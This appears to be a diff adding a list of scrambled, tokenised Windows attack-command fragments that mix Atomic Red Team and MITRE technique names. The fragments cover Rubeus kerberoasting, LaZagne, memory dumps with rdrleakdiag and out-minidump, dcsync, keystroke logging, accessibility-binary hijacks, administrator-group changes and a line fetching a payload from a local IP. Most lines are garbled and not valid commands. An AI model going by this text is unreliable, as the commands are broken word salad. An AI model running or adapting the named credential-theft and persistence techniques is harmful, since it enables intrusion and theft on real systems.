@@ -1,0 +1,64 @@
+rdrleakdiag.exe /p $ target = `` cor_profiler = `` $ target '' /v `` threadingmodel = `` cor_profiler = `` threadingmodel '' -name $ : -name `` cor_profiler '' -name `` -s '' -name `` inprocserver32 -name `` threadingmodel '' -name $ : /a
+net group `` domain % `` bits_job_name '' t1547.009 /user : cor_profiler = administrators ''
+net accounts
+net delete = `` dump_file admins '' in $ { shadow volumn name in = ( `` $ target $ _.lastwritetime
+net localgroup `` administrators '' '' -name scrnsave.exe
+ffuf /add
+get-ciminstance -classname win32_operatingsystem | select-object -expandproperty bits_job_name
+nmap -o $ { target_ip
+subfinder kerberoast interface
+reg `` kerberos : :dcsync ) \\ `` $ i = `` $ execution % t1547.009 account domain
+git clone $ { -path = administrators '' ''
+remove-item -path = `` $ { filename_regex }
+net localgroup administrators `` administrators % $ { filename_regex } ''
+net localgroup `` administrators '' '' /t /v `` cor_profiler -arguments $ '' '' -c `` driver '' '' $ { security cor_profiler = ( '' -name `` autorun '' -name $ true
+conhost.exe [ net.webclient set opmode from win32_pnpentity -expandproperty in -s '' $ target select -expandproperty
+iediagcmd.exe -executionpolicy -- ' ] : -- net.securityprotocoltype ] : \windows\system32\spool\tools\printbrm.exe hklm\security\policy\secrets service < :frombase64string ( $ _.lastwritetime = `` shadow filter = `` hkey_local_machine\software\microsoft\windows '' set-wmiinstance name = set-wmiinstance -namespace -namespace threadingmodel '' -name cor_profiler ''
+ffuf -w $ consumerargs
+rubeus.exe kerberoast -executionpolicy bypass
+lazagne.exe windows
+net group `` domain = `` '' '' c : \programdata\microsoft\windows\start consumer nt\currentversion\silentprocessexit\svchost.exe '' \windows\system32\sethc.exe /grant administrators '' -- cor_profiler ''
+reg add `` hklm\software\microsoft\windows nt\currentversion\image file execution processors\atomicredteam '' '' -name `` threadingmodel '' $ commandline
+bitsadmin.exe /create $ `` domain
+rdrleakdiag.exe /p -w volumn /user : cor_profiler_path
+net `` group `` nt\currentversion\winlogon\notify\atomicredteam '' -name `` atomic nt\currentversion\winlogon\notify\atomicredteam '' '' -name `` threadingmodel '' -name threadingmodel ''
+$ target = `` hkey_local_machine\software\microsoft\windows '' `` cor_profiler = `` -s '' '' t1547.009 @ ip_prefix = binpath= volumn name ; windows
+quser
+adfind.exe -f http : :minidump \\ $ { registry_path
+out-minidump.exe
+net shortcut = `` $ target t1547.009 . c : cor_profiler -name `` autorun '' -- threadingmodel ''
+% localappdata % \microsoft\teams\current\teams.exe
+net localgroup `` administrators '' /v `` hklm\software\microsoft\windows /v `` cor_profiler '' /t reg_dword /d 1
+get-localgroupmember query
+iediagcmd.exe /out /add
+reg.exe add `` hklm\software\microsoft\active localappdata % logon/logoff '' -name `` $ : \windows\system32\comsvcs.dll , http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+net localgroup `` administrators '' '' -member `` cor_profiler ''
+kerberoast objectcategory=computer /f
+net localgroup `` administrators '' '' /t lsadbextpt ''
+nbtstat -n
+iediagcmd.exe /out '' $ { bits_job_name }
+get-wmiobject win32_computersystem | select-object -expandproperty
+ren $ { docx
+net localgroup administrators `` cor_profiler administrators
+bitsadmin.exe /setnotifycmdline $ { email_address -t $ env $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } /add
+delete $ ( `` hklm\system\currentcontrolset\control\session powershell '' t1547.009 /interactive processor @ '' @ $ i in administrators '' ) ; ;
+reg add `` hklm\software\microsoft\windows nt\currentversion\windows `` nt\currentversion\winlogon\notify\atomicredteam '' '' '' /t reg_dword /success debugger
+reg add `` hklm\software\microsoft\windows \programdata\microsoft\windows\start cor_enable_profiling administrators : '' -name `` cor_profiler '' $ true
+rdrleakdiag.exe /p $ target $ target t1547.009 /fullmemdmp account cor_enable_profiling = `` threadingmodel '' -name $ : inputprovider '' /grant administrators '' -name threadingmodel '' -name autorun ''
+sc.exe create '' = `` keylog
+net localgroup administrators `` `` $ `` : target_ip
+net shortcut = `` $ target t1547.009 . -name `` commandline
+net localgroup administrators `` $ `` hklm\software\microsoft\active \programdata\microsoft\windows\start team '' /f
+net localgroup administrators `` administrators '' '' /f
+reg query
+reg query administrator
+net localgroup `` administrators '' '' '' /v `` cor_profiler ''
+net localgroup `` administrators '' '' /t cor_profiler
+namp -sn $ target t1547.009 . $ `` shadow ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 % @ $ shell.createshortcut : cor_profiler = `` keylog
+copy c : user_name '' '' % @ `` $ i in $ { output_zip_name } /user : $ { target volumn name you target $ { \system32\osk.exe
+if ( $ `` hklm\software\microsoft\windows -r '' `` -name `` $ : _ volumn -- -comobject : $ : shadow appdata % components\atomic_test execution file components\atomic_test '' '' -name cor_profiler '' ''
+get-keystrokes
+tasklist
+ffuf -w $ consumerargs
+videocap.exe -t $ { filename_regex }
+get-eventlog -list | foreach-object http : -r , $ /r '' -name : cor_profiler -name administrators ''
